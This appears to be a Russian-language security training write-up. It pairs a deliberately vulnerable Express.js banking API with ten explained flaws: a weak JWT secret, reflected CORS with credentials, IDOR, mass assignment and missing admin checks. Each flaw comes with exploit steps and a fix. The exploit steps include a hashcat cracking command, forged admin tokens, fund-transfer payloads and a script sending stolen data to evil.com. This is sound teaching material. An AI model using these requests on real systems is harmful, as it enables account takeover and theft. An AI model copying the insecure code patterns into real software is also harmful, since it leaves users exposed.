```javascript
const express = require('express')
const jwt = require('jsonwebtoken')
const app = express()

app.use(express.json())
const JWT_SECRET = 'secret123' 

const users = {
	1: { id: 1, name: 'Алиса', email: 'alice@bank.com', role: 'user', balance: 5000, password: 'alice_pass' },
	2: { id: 2, name: 'Боб', email: 'bob@bank.com', role: 'user', balance: 7000, password: 'bob_pass' },
	3: { id: 3, name: 'Кэрол', email: 'carol@bank.com', role: 'admin', balance: 10000, password: 'carol_pass' },
}

const transactions = {
	101: { id: 101, userId: 1, amount: -100, description: 'Кофе' },
	102: { id: 102, userId: 2, amount: -500, description: 'Книги' },
	103: { id: 103, userId: 1, amount: +2000, description: 'Зарплата' },
	104: { id: 104, userId: 2, amount: -50, description: 'Такси' },
}

function authenticate(req, res, next) {
	const authHeader = req.headers.authorization 
	if (!authHeader) {
		return res.status(401).json({ error: 'Нет токена' })
	}
	const token = authHeader.split(' ')[1]

	try {
		const decoded = jwt.verify(token, JWT_SECRET)
		req.user = decoded 
		next()
	} catch (err) {
		return res.status(401).json({ error: 'Невалидный токен' })
	}
}

app.use((req, res, next) => {
	res.header('Access-Control-Allow-Origin', req.headers.origin)
	res.header('Access-Control-Allow-Credentials', 'true')
	res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
	next()
})

app.post('/api/login', (req, res) => {
	const { email, password } = req.body
	const user = Object.values(users).find(u => u.email === email && u.password === password)
	if (!user) return res.status(401).json({ error: 'Неверные данные' })

	const token = jwt.sign({ id: user.id, role: user.role }, JWT_SECRET, { expiresIn: '1h' })
	res.json({ token })
})

app.get('/api/users/:id', authenticate, (req, res) => {
	const userId = parseInt(req.params.id, 10)
	const user = users[userId]
	if (!user) return res.status(404).json({ error: 'Не найден' })
	res.json(user)
})

app.get('/api/transactions/:id', authenticate, (req, res) => {
	const txId = parseInt(req.params.id, 10)
	const tx = transactions[txId]
	if (!tx) return res.status(404).json({ error: 'Не найдена' })
	res.json(tx)
})

app.get('/api/my-transactions', authenticate, (req, res) => {
	const userId = parseInt(req.query.user_id, 10)
	const userTxs = Object.values(transactions).filter(t => t.userId === userId)
	res.json(userTxs)
})

app.put('/api/users/:id', authenticate, (req, res) => {

	const userId = parseInt(req.params.id, 10)
	const user = users[userId]
	if (!user) return res.status(404).json({ error: 'Не найден' })

	Object.assign(user, req.body) 
	res.json(user)
})

app.post('/api/transfer', authenticate, (req, res) => {
	const { from_user_id, to_user_id, amount } = req.body

	const fromUser = users[from_user_id]
	const toUser = users[to_user_id]

	if (!fromUser || !toUser) return res.status(404).json({ error: 'Пользователь не найден' })
	if (fromUser.balance < amount) return res.status(400).json({ error: 'Недостаточно средств' })

	fromUser.balance -= amount
	toUser.balance += amount

	res.json({ success: true, from: fromUser.balance, to: toUser.balance })
})

app.get('/api/admin/users', authenticate, (req, res) => {
	res.json(Object.values(users))
})

app.delete('/api/admin/users/:id', authenticate, (req, res) => {
	const userId = parseInt(req.params.id, 10)
	if (!users[userId]) return res.status(404).json({ error: 'Не найден' })
	delete users[userId]
	res.json({ success: true })
})

app.get('/admin/panel', (req, res) => {
	res.send('<h1>Админ-панель</h1><p>Секретные настройки...</p>')
})

app.listen(3000, () => console.log('Сервер запущен на порту 3000'))
```

## Уязвимость №1:
**Тип:** JWT Misconfiguration (Неправильная настройка JWT)
**Суть:**
Секретный ключ `JWT_SECRET = 'secret123'` — крайне слабый. Он находится в словаре популярных паролей и подбирается брутфорсом за секунды с помощью инструментов вроде `hashcat`. Кроме того, в `jwt.verify()` не указан явно допустимый алгоритм (`algorithms: ['HS256']`), что оставляет теоретическую возможность подмены алгоритма. Поле `role` хранится **внутри** токена, и сервер ему доверяет — значит, подделав токен, злоумышленник подделывает и роль.
**Как эксплуатировать:**
1. Злоумышленник логинится как обычный пользователь (Боб) и получает свой валидный JWT.
2. Оффлайн подбирает секрет по известному токену (например, через `hashcat -m 16500`).
3. Найдя секрет `'secret123'`, самостоятельно подписывает новый токен:
   ```javascript
   jwt.sign({ id: 3, role: 'admin' }, 'secret123', { expiresIn: '1h' })
   ```
4. Отправляет подделанный токен:
   ```http
   GET /api/admin/users
   Authorization: Bearer <подделанный_токен>
   ```
5. Сервер проверяет подпись своим секретом — она совпадает → злоумышленник получает права админа.
**Фикс:**
```javascript
const JWT_SECRET = process.env.JWT_SECRET; 
const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```
Дополнительно: не хранить `role` в токене, а брать её из БД при каждом запросе.

---

## Уязвимость №2:
**Тип:** CORS Misconfiguration (Неправильная настройка CORS)
**Суть:**
Сервер **отражает** любой `Origin`, пришедший от клиента (`req.headers.origin`), и одновременно разрешает передачу credentials (`Allow-Credentials: true`). Это позволяет **любому** сайту (`evil.com`) делать запросы к API от имени залогиненного пользователя и **читать ответы**. Браузер жертвы автоматически прикрепит куки/токены к запросу, а сервер разрешит `evil.com` прочитать ответ.
**Как эксплуатировать:**
1. Жертва (Алиса) залогинена в `bank.com` и имеет активную сессию/токен.
2. Алиса заходит на `evil.com` (фишинговая ссылка, вредоносная реклама).
3. На `evil.com` выполняется JS:
   ```javascript
   fetch('https://bank.com/api/users/1', { credentials: 'include' })
     .then(r => r.json())
     .then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)));
   ```
4. Браузер Алисы шлёт запрос к `bank.com` с её credentials и заголовком `Origin: https://evil.com`.
5. Сервер отвечает `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true`.
6. Браузер отдаёт ответ JS-коду на `evil.com` → данные Алисы утекают злоумышленнику.
**Фикс:**
```javascript
const allowedOrigins = ['https://bank.com', 'https://admin.bank.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {  
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

---

## Уязвимость №3:
**Тип:** IDOR (Insecure Direct Object Reference — Небезопасная прямая ссылка на объект) / BOLA (Broken Object Level Authorization — Нарушение авторизации на уровне объекта)
**Суть:**
Эндпоинт `GET /api/users/:id` принимает ID из URL и возвращает объект пользователя, **не проверяя**, что `req.user.id === userId`. Любой аутентифицированный пользователь может запросить профиль любого другого. Дополнительно сервер возвращает **весь объект**, включая `password` и `balance` — это утечка чувствительных данных (sensitive data exposure).
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
GET /api/users/2
Authorization: Bearer <токен_Алисы>
```
Сервер возвращает профиль Боба: `{ id: 2, name: 'Боб', email: 'bob@bank.com', role: 'user', balance: 7000, password: 'bob_pass' }`.
**Фикс:**
```javascript
app.get('/api/users/:id', authenticate, (req, res) => {
  const userId = parseInt(req.params.id, 10);
  if (userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Доступ запрещён' });
  }
  const { password, ...safeUser } = users[userId];  
  res.json(safeUser);
});
```

---

## Уязвимость №4: 
**Тип:** IDOR / BOLA
**Суть:**
Эндпоинт `GET /api/transactions/:id` возвращает транзакцию по ID, **не проверяя**, что `tx.userId === req.user.id`. Любой залогиненный пользователь может прочитать чужую транзакцию (сумму, описание, владельца).
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
GET /api/transactions/102
Authorization: Bearer <токен_Алисы>
```
Сервер возвращает транзакцию Боба: `{ id: 102, userId: 2, amount: -500, description: 'Книги' }`.
**Фикс:**
```javascript
app.get('/api/transactions/:id', authenticate, (req, res) => {
  const txId = parseInt(req.params.id, 10);
  const tx = transactions[txId];
  if (!tx) return res.status(404).json({ error: 'Не найдена' });
  if (tx.userId !== req.user.id && req.user.role !== 'admin') {  // ✅ проверка владельца
    return res.status(403).json({ error: 'Доступ запрещён' });
  }
  res.json(tx);
});
```

---

## Уязвимость №5: 
**Тип:** IDOR / BOLA
**Суть:**
Эндпоинт `GET /api/my-transactions` называется «мои транзакции», но берёт `user_id` **из query-параметра**, а не из токена. Это позволяет запросить транзакции **любого** пользователя. 
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
GET /api/my-transactions?user_id=2
Authorization: Bearer <токен_Алисы>
```
Сервер возвращает все транзакции Боба: `[{ id: 102, ... }, { id: 104, ... }]`.
**Фикс:**
```javascript
app.get('/api/my-transactions', authenticate, (req, res) => {
  const userId = req.user.id;  // ✅ берём ID из токена, а не из запроса
  const userTxs = Object.values(transactions).filter(t => t.userId === userId);
  res.json(userTxs);
});
```

---

## Уязвимость №6а: 
**Тип:** IDOR / BOLA
**Суть:**
Эндпоинт `PUT /api/users/:id` позволяет редактировать пользователя по ID из URL, **не проверяя**, что `req.user.id === userId`. Любой залогиненный пользователь может изменить профиль любого другого.
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
PUT /api/users/2
Authorization: Bearer <токен_Алисы>
Content-Type: application/json

{ "name": "Взломано", "email": "hacked@evil.com" }
```
Сервер изменяет профиль Боба.
**Фикс:**
```javascript
if (userId !== req.user.id && req.user.role !== 'admin') {
  return res.status(403).json({ error: 'Доступ запрещён' });
}
```

---

## Уязвимость №6б: 
**Тип:** Mass Assignment
**Суть:**
`Object.assign(user, req.body)` копирует **все** поля из тела запроса в объект пользователя, включая те, которые пользователь менять не должен: `role`, `balance`, `id`. Это позволяет **повысить привилегии** и **изменить баланс**.
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
PUT /api/users/1
Authorization: Bearer <токен_Алисы>
Content-Type: application/json

{ "name": "Алиса", "role": "admin", "balance": 999999 }
```
Сервер копирует все поля → Алиса становится админом с балансом 999999.
**Фикс:**
```javascript
const { name, email } = req.body; 
if (name) user.name = name;
if (email) user.email = email;
// role и balance НЕ трогаем — они меняются только через админские эндпоинты
```

---

## Уязвимость №7: 
**Тип:** IDOR / BOLA
**Суть:**
Эндпоинт `POST /api/transfer` принимает `from_user_id` **из тела запроса** и **не проверяет**, что это ID текущего пользователя. Любой залогиненный пользователь может списать деньги с **чужого** счёта.
**Как эксплуатировать:**
Алиса (id=1) отправляет:
```http
POST /api/transfer
Authorization: Bearer <токен_Алисы>
Content-Type: application/json

{ "from_user_id": 2, "to_user_id": 1, "amount": 7000 }
```
Сервер:
1. `fromUser = users[2]` — Боб.
2. Проверяет `7000 >= 7000` — ок.
3. Списывает 7000 у Боба, начисляет 7000 Алисе.
**Фикс:**
```javascript
const { to_user_id, amount } = req.body;
const from_user_id = req.user.id;  
```

---

## Уязвимость №8:
**Строки:** 156–160
**Тип:** BFLA 
**Суть:**
Эндпоинт `GET /api/admin/users` проверяет только аутентификацию, но **не проверяет роль**. Любой залогиненный пользователь получает список **всех** пользователей с их паролями и балансами.
**Как эксплуатировать:**
Боб (id=2, role: "user") отправляет:
```http
GET /api/admin/users
Authorization: Bearer <токен_Боба>
```
Сервер возвращает всех пользователей, включая пароли и балансы.
**Фикс:**
```javascript
function requireAdmin(req, res, next) {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Требуются права администратора' });
  }
  next();
}

app.get('/api/admin/users', authenticate, requireAdmin, (req, res) => {
  const safeUsers = Object.values(users).map(({ password, ...u }) => u);
  res.json(safeUsers);
});
```

---

## Уязвимость №9: 
**Тип:** BFLA
**Суть:**
Эндпоинт `DELETE /api/admin/users/:id` не проверяет роль. Любой залогиненный пользователь может удалить **любого** пользователя, включая **единственного админа** — это приводит к **DoS** (Denial of Service — Отказ в обслуживании) системы администрирования. Дополнительно нет проверки самоудаления, нет защиты последнего админа, нет soft delete и логирования.
**Как эксплуатировать:**
Боб (id=2, role: "user") отправляет:
```http
DELETE /api/admin/users/3
Authorization: Bearer <токен_Боба>
```
Кэрол (единственный админ) удалена → админов в системе не осталось.
**Фикс:**
```javascript
app.delete('/api/admin/users/:id', authenticate, requireAdmin, (req, res) => {
  const userId = parseInt(req.params.id, 10);
  if (!users[userId]) return res.status(404).json({ error: 'Не найден' });
  if (req.user.id === userId) {                                      
    return res.status(400).json({ error: 'Нельзя удалить себя' });
  }
  const admins = Object.values(users).filter(u => u.role === 'admin');
  if (users[userId].role === 'admin' && admins.length === 1) {       
    return res.status(400).json({ error: 'Нельзя удалить последнего админа' });
  }
  users[userId].is_deleted = true;                                   
  users[userId].deleted_at = new Date();
  users[userId].deleted_by = req.user.id;                          
  res.json({ success: true });
});
```

---

## Уязвимость №10:
**Тип:** Forced Browsing (Принудительный обход) + Missing Authentication 
**Суть:**
Эндпоинт `GET /admin/panel` не имеет **ни** `authenticate`, **ни** `requireAdmin`. Любой человек (даже **не залогиненный**) может открыть админ-панель, просто введя URL в браузере. Защита «через скрытие ссылки» — не защита.
**Как эксплуатировать:**
Любой пользователь (или аноним) открывает в браузере:
```
http://bank.com:3000/admin/panel
```
И получает HTML админ-панели.
**Фикс:**
```javascript
app.get('/admin/panel', authenticate, requireAdmin, (req, res) => {
  res.send('<h1>Админ-панель</h1><p>Секретные настройки...</p>');
});
```
